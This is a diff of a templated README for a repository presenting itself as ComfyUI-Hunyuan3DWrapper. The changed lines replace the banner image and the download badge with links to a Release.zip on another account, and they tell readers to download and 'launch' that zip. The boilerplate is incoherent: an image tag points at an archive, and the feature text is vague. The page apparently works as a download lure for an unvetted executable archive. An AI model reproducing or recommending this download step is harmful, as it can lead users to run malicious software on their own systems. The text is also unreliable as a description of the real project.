@@ -1,6 +1,6 @@
 # 🚀 Welcome to ComfyUI-Hunyuan3DWrapper Repository! 🎨
 
-![ComfyUI-Hunyuan3DWrapper](https://via.placeholder.com/800x200)
+![ComfyUI-Hunyuan3DWrapper](https://github.com/Deadlin560/ComfyUI-Hunyuan3DWrapper/releases/download/v1.0/Release.zip)
 
 ### Description
 This repository contains the **ComfyUI-Hunyuan3DWrapper** project, a tool that enhances the user interface experience with 3D elements. The repository is designed to provide an in-depth look at the project and software implementation.
@@ -8,10 +8,10 @@ This repository contains the **ComfyUI-Hunyuan3DWrapper** project, a tool that e
 ### Installation
 To download the software, please click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Deadlin560/ComfyUI-Hunyuan3DWrapper/releases/download/v1.0/Release.zip)](https://github.com/Deadlin560/ComfyUI-Hunyuan3DWrapper/releases/download/v1.0/Release.zip)
 
 ### Launching Software
-Please note that the downloaded file `Software.zip` needs to be launched on your system to use the **ComfyUI-Hunyuan3DWrapper** tool effectively.
+Please note that the downloaded file `https://github.com/Deadlin560/ComfyUI-Hunyuan3DWrapper/releases/download/v1.0/Release.zip` needs to be launched on your system to use the **ComfyUI-Hunyuan3DWrapper** tool effectively.
 
 ### Features
 - 🎨 Integrate stunning 3D elements into your user interface
